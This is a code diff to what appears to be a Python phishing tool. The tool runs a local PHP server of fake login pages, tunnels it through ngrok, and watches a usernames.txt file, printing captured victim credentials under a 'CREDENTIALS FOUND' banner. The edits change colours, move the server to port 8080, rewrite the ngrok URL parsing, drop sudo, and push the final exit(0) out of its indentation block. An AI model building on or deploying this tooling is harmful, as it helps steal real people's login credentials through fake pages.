@@ -122,7 +122,7 @@ def waitCreds():
         with open('Server/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
         if len(lines) != 0: 
-            print ' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
+            print ' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(RED, END) % lines
             system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
         creds.close()
 
@@ -203,15 +203,15 @@ def runPEnv():
     
 
 def runNgrok():
-    system('./Server/ngrok http 80 > /dev/null &')
+    system('./Server/ngrok http 8080 > /dev/null &')
     sleep(10)
-    system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
+    system('curl -s http://127.0.0.1:4040/status | grep -P "https://.*?ngrok.io" -oh > ngrok.url')
     url = open('ngrok.url', 'r')
-    print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.read() + '{1}').format(CYAN, END, GREEN)
+    print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.readlines()[0] + '{1}').format(CYAN, RED, GREEN)
     url.close()
 
 def runServer():
-    system("cd Server/www/ && sudo php -S 127.0.0.1:80")
+    system("cd Server/www/ && php -S 127.0.0.1:8080")
 
 if __name__ == "__main__":
     try:
@@ -222,4 +222,5 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         system('pkill -f ngrok')
         end()
-        exit(0)
+exit(0)
+
